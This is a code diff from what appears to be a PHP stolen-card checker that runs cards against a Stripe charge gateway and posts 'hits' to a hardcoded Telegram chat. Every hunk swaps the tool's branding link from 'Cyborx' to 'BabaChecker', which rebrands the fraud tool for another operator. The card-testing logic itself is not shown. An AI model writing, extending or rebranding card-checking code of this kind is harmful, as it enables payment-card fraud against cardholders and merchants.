@@ -293,7 +293,7 @@ if ((stripos($response, 'Payment Successful') !== false)) {
         "<b>Response ➜</b> {$err} 🎉\n" .
         "<b>Gateway ➜</b> NonSK Charge (Stripe)\n" .
         "━━━━━━━━\n" .
-        "<b>Hit From ➜</b> <a href=\"https://cyborx.net\">Cyborx</a>";
+        "<b>Hit From ➜</b> <a href=\"https://babachecker.com\">BabaChecker</a>";
     sendTelegramMessage($botToken, '-1002552641928', $publicMessage);
     echo json_encode([
         'status' => 'charge',
@@ -340,7 +340,7 @@ elseif (stripos($response, 'requires_action') !== false) {
         "<b>Response ➜</b> {$err}\n" .
         "<b>Gateway ➜</b> NonSK Charge (Stripe)\n" .
         "━━━━━━━━\n" .
-        "<b>Hit From ➜</b> <a href=\"https://cyborx.net\">Cyborx</a>";
+        "<b>Hit From ➜</b> <a href=\"https://babachecker.com\">BabaChecker</a>";
     sendTelegramMessage($botToken, '-1002552641928', $publicMessage);
 
     echo json_encode([
@@ -390,7 +390,7 @@ elseif (stripos($response, 'requires_action') !== false) {
         "<b>Response ➜</b> {$err}\n" .
         "<b>Gateway ➜</b> NonSK Charge (Stripe)\n" .
         "━━━━━━━━\n" .
-        "<b>Hit From ➜</b> <a href=\"https://cyborx.net\">Cyborx</a>";
+        "<b>Hit From ➜</b> <a href=\"https://babachecker.com\">BabaChecker</a>";
     sendTelegramMessage($botToken, '-1002552641928', $publicMessage);
 
     echo json_encode([
@@ -441,7 +441,7 @@ elseif (stripos($response, 'requires_action') !== false) {
         "<b>Response ➜</b> {$err}\n" .
         "<b>Gateway ➜</b> NonSK Charge (Stripe)\n" .
         "━━━━━━━━\n" .
-        "<b>Hit From ➜</b> <a href=\"https://cyborx.net\">Cyborx</a>";
+        "<b>Hit From ➜</b> <a href=\"https://babachecker.com\">BabaChecker</a>";
     sendTelegramMessage($botToken, '-1002552641928', $publicMessage);
 
     echo json_encode([
@@ -490,7 +490,7 @@ elseif (stripos($response, 'requires_action') !== false) {
         "<b>Response ➜</b> {$err}\n" .
         "<b>Gateway ➜</b> NonSK Charge (Stripe)\n" .
         "━━━━━━━━\n" .
-        "<b>Hit From ➜</b> <a href=\"https://cyborx.net\">Cyborx</a>";
+        "<b>Hit From ➜</b> <a href=\"https://babachecker.com\">BabaChecker</a>";
     sendTelegramMessage($botToken, '-1002552641928', $publicMessage);
 
     echo json_encode([
